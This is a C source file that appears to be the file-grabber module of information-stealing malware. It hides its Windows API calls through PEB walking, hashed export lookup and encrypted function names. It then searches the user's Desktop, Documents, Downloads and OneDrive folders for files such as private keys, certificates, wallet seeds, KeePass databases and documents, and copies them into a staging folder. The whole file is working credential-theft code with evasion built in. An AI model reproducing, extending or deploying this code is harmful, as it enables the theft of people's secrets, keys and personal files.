#include "grabber.h"
#include "config.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include <windows.h>

#ifdef ENABLE_FILE_GRABBER
#include <string.h>
#include <stdio.h>
#include <ctype.h>

#define GRAB_MAX_PATH 512
#define GRAB_READ_BUF (256 * 1024)
#define GRAB_MAX_SIZE (10 * 1024 * 1024) /* 10 MB */

/* ── API function pointer types (kernel32.dll) ──────────────────── */

typedef HANDLE (WINAPI *pCreateFileA_gb)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *pReadFile_gb)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *pWriteFile_gb)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *pCloseHandle_gb)(HANDLE);
typedef BOOL   (WINAPI *pCreateDirectoryA_gb)(LPCSTR, LPSECURITY_ATTRIBUTES);
typedef DWORD  (WINAPI *pGetFileAttributesA_gb)(LPCSTR);
typedef BOOL   (WINAPI *pDeleteFileA_gb)(LPCSTR);
typedef HANDLE (WINAPI *pFindFirstFileA_gb)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *pFindNextFileA_gb)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *pFindClose_gb)(HANDLE);
typedef DWORD  (WINAPI *pGetFileSize_gb)(HANDLE, LPDWORD);
typedef HANDLE (WINAPI *pGetProcessHeap_gb)(void);
typedef LPVOID (WINAPI *pHeapAlloc_gb)(HANDLE, DWORD, SIZE_T);
typedef BOOL   (WINAPI *pHeapFree_gb)(HANDLE, DWORD, LPVOID);

/* ── Resolved API pointers ──────────────────────────────────────── */

static struct {
    pCreateFileA_gb        pCreateFile;
    pReadFile_gb           pReadFile;
    pWriteFile_gb          pWriteFile;
    pCloseHandle_gb        pCloseHandle;
    pCreateDirectoryA_gb   pMkDir;
    pGetFileAttributesA_gb pGetAttr;
    pDeleteFileA_gb        pDeleteFile;
    pFindFirstFileA_gb     pFF;
    pFindNextFileA_gb      pFN;
    pFindClose_gb          pFC;
    pGetFileSize_gb        pGetFileSize;
    pGetProcessHeap_gb     pGetHeap;
    pHeapAlloc_gb          pAlloc;
    pHeapFree_gb           pFree;
    int                    ready;
} gb_api;

static void *gb_resolve(void *mod, const char *name) {
    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
}

static int gb_ensure_api(void) {
    if (gb_api.ready) return 1;

    char dll[32], fn[32];
    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;

    enc_decrypt(enc_CreateFileA, ENC_CREATEFILEA_LEN, fn);
    gb_api.pCreateFile = (pCreateFileA_gb)gb_resolve(k32, fn);
    enc_decrypt(enc_ReadFile, ENC_READFILE_LEN, fn);
    gb_api.pReadFile = (pReadFile_gb)gb_resolve(k32, fn);
    enc_decrypt(enc_WriteFile, ENC_WRITEFILE_LEN, fn);
    gb_api.pWriteFile = (pWriteFile_gb)gb_resolve(k32, fn);
    enc_decrypt(enc_CloseHandle, ENC_CLOSEHANDLE_LEN, fn);
    gb_api.pCloseHandle = (pCloseHandle_gb)gb_resolve(k32, fn);
    enc_decrypt(enc_CreateDirectoryA, ENC_CREATEDIRECTORYA_LEN, fn);
    gb_api.pMkDir = (pCreateDirectoryA_gb)gb_resolve(k32, fn);
    enc_decrypt(enc_GetFileAttributesA, ENC_GETFILEATTRIBUTESA_LEN, fn);
    gb_api.pGetAttr = (pGetFileAttributesA_gb)gb_resolve(k32, fn);
    enc_decrypt(enc_DeleteFileA, ENC_DELETEFILEA_LEN, fn);
    gb_api.pDeleteFile = (pDeleteFileA_gb)gb_resolve(k32, fn);
    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
    gb_api.pFF = (pFindFirstFileA_gb)gb_resolve(k32, fn);
    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
    gb_api.pFN = (pFindNextFileA_gb)gb_resolve(k32, fn);
    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
    gb_api.pFC = (pFindClose_gb)gb_resolve(k32, fn);
    enc_decrypt(enc_GetFileSize, ENC_GETFILESIZE_LEN, fn);
    gb_api.pGetFileSize = (pGetFileSize_gb)gb_resolve(k32, fn);
    enc_decrypt(enc_GetProcessHeap, ENC_GETPROCESSHEAP_LEN, fn);
    gb_api.pGetHeap = (pGetProcessHeap_gb)gb_resolve(k32, fn);
    enc_decrypt(enc_HeapAlloc, ENC_HEAPALLOC_LEN, fn);
    gb_api.pAlloc = (pHeapAlloc_gb)gb_resolve(k32, fn);
    enc_decrypt(enc_HeapFree, ENC_HEAPFREE_LEN, fn);
    gb_api.pFree = (pHeapFree_gb)gb_resolve(k32, fn);

    if (!gb_api.pCreateFile || !gb_api.pReadFile || !gb_api.pWriteFile ||
        !gb_api.pCloseHandle || !gb_api.pMkDir || !gb_api.pGetAttr ||
        !gb_api.pFF || !gb_api.pFN || !gb_api.pFC ||
        !gb_api.pGetFileSize || !gb_api.pGetHeap || !gb_api.pAlloc ||
        !gb_api.pFree)
        return 0;

    gb_api.ready = 1;
    return 1;
}

/* ── Target extensions ──────────────────────────────────────────── */

static const char *target_exts[] = {
    "txt", "doc", "docx", "pdf",
    "key", "pem", "p12", "pfx",
    "seed", "json", "csv", "kdbx",
    NULL
};

static int has_target_ext(const char *name) {
    const char *dot = strrchr(name, '.');
    if (!dot) return 0;
    dot++;
    for (int i = 0; target_exts[i]; i++) {
        if (_stricmp(dot, target_exts[i]) == 0)
            return 1;
    }
    return 0;
}

/* ── Copy a single file via PEB-resolved APIs ───────────────────── */

static int copy_file(const char *src, const char *dst) {
    HANDLE hIn = gb_api.pCreateFile(src, GENERIC_READ, FILE_SHARE_READ,
                                    NULL, OPEN_EXISTING, 0, NULL);
    if (hIn == INVALID_HANDLE_VALUE) return -1;

    DWORD fileSize = gb_api.pGetFileSize(hIn, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0 || fileSize > GRAB_MAX_SIZE) {
        gb_api.pCloseHandle(hIn);
        return -1;
    }

    char *buf = (char *)gb_api.pAlloc(gb_api.pGetHeap(), 0, fileSize);
    if (!buf) {
        gb_api.pCloseHandle(hIn);
        return -1;
    }

    DWORD read = 0;
    BOOL ok = gb_api.pReadFile(hIn, buf, fileSize, &read, NULL);
    gb_api.pCloseHandle(hIn);
    if (!ok || read == 0) {
        gb_api.pFree(gb_api.pGetHeap(), 0, buf);
        return -1;
    }

    HANDLE hOut = gb_api.pCreateFile(dst, GENERIC_WRITE, 0,
                                     NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        gb_api.pFree(gb_api.pGetHeap(), 0, buf);
        return -1;
    }

    DWORD written = 0;
    ok = gb_api.pWriteFile(hOut, buf, read, &written, NULL);
    gb_api.pCloseHandle(hOut);
    gb_api.pFree(gb_api.pGetHeap(), 0, buf);
    return ok ? 0 : -1;
}

/* ── Scan a single directory ────────────────────────────────────── */

static int scan_dir(const char *dir, const char *output_dir, size_t *count, size_t max_files) {
    char pattern[GRAB_MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = gb_api.pFF(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return -1;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (*count >= max_files) break;
        if (!has_target_ext(fd.cFileName)) continue;

        DWORD hi = fd.nFileSizeHigh;
        DWORD lo = fd.nFileSizeLow;
        if (hi > 0 || lo > GRAB_MAX_SIZE) continue;

        char src_path[GRAB_MAX_PATH];
        snprintf(src_path, sizeof(src_path), "%s\\%s", dir, fd.cFileName);

        char dst_path[GRAB_MAX_PATH];
        snprintf(dst_path, sizeof(dst_path), "%s\\%s", output_dir, fd.cFileName);

        if (copy_file(src_path, dst_path) == 0)
            (*count)++;

    } while (gb_api.pFN(hFind, &fd));

    gb_api.pFC(hFind);
    return 0;
}

int grabber_collect(const char *output_dir, size_t max_files) {
    if (!output_dir || max_files == 0) return -1;
    if (!gb_ensure_api()) return -1;

    gb_api.pMkDir(output_dir, NULL);

    const char *home = getenv("USERPROFILE");
    if (!home) home = getenv("HOME");
    if (!home) return -1;

    const char *dirs[] = {
        "Desktop", "Documents", "Downloads",
        "OneDrive\\Desktop", "OneDrive\\Documents", "OneDrive\\Downloads",
        NULL
    };

    size_t count = 0;
    for (int i = 0; dirs[i]; i++) {
        if (count >= max_files) break;
        char dirpath[GRAB_MAX_PATH];
        snprintf(dirpath, sizeof(dirpath), "%s\\%s", home, dirs[i]);
        scan_dir(dirpath, output_dir, &count, max_files);
    }

    return (int)count;
}

#endif /* ENABLE_FILE_GRABBER */
